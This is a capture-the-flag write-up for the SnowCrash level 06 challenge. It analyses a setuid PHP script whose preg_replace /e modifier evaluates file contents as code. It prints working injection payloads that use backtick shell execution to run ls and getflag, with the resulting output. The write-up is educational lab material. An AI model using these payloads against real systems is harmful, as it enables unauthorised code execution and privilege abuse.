# Level 06

When we examine what's inside the working directory, we get the following files:

    level06@SnowCrash:~$ ls
    level06  level06.php

When analyzing the executable file "level06" we see that it takes a file as argument:
    level06@SnowCrash:~$ ./level06
    PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

And looks like the source code from which the executable file was compiled from was level06.php:

    level06@SnowCrash:~$ strings level06
    ...
    /usr/bin/php
    /home/user/level06/level06.php
    ...

    level06@SnowCrash:~$ cat level06.php

    #!/usr/bin/php
    <?php
    
    function y($m) { 
	    $m = preg_replace("/\./", " x ", $m); 
	    $m = preg_replace("/@/", " y", $m); return $m; 
	    }
	
    function x($y, $z) { 
	    $a = file_get_contents($y); 
	    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
	    $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); 
	    return $a; 
	    }
	
    $r = x($argv[1], $argv[2]); print $r;
    
    ?>

This PHP script is designed to process a file's content based on specific regular expression replacements.

It looks for patterns like `[x ...]` and replaces them with modified versions of the inner content.

The function y($m) takes a string $m and replaces:
- Every `.` with ` x `.
- Every `@` with ` y`.

The function x($y, $z) takes two arguments, $y and $z.
- $y is the filename whose content will be processed.
- $z is not used in the function.

- preg_replace("/\[/", "(", $a): Replaces all `[` with `(`
- preg_replace("/\]/", ")", $a): Replaces all `]` with `)`


For instance:

    level06@SnowCrash:~$ echo "THIS IS A TEST : [x HELLO ... @@@]" > /tmp/testa
    level06@SnowCrash:~$ ./level06 /tmp/testa
    THIS IS A TEST : HELLO  x  x  x   y y y

    
## Security problem

The use of the `/e` modifier in `preg_replace` is highly insecure as it allows execution of arbitrary PHP code, which means that whatever is parsed is transformed into php code. This can lead to security vulnerabilities such as code injection if the input is not properly sanitized.

Hence, the string remplacement can be evaluated as PHP code, we can execute commands to see if we get lucky:
For example :

    level06@SnowCrash:~$ echo 'TRYING THIS STUFF [x ${`ls -al`} ]' > /tmp/test
    level06@SnowCrash:~$ ./level06 /tmp/test
    PHP Notice:  Undefined variable: total 24
    dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
    d--x--x--x  1 root    users    340 Aug 30  2015 ..
    -r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
    -r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
    -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
    -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
    -r-x------  1 level06 level06  675 Apr  3  2012 .profile
     in /home/user/level06/level06.php(4) : regexp code on line 1  

Now all we have to do is the same but with the getflag program, and we have our token.

    level06@SnowCrash:~$ echo 'TRYING THIS STUFF [x ${`getflag`} ]' > /tmp/test

https://www.php.net/manual/en/language.operators.execution.php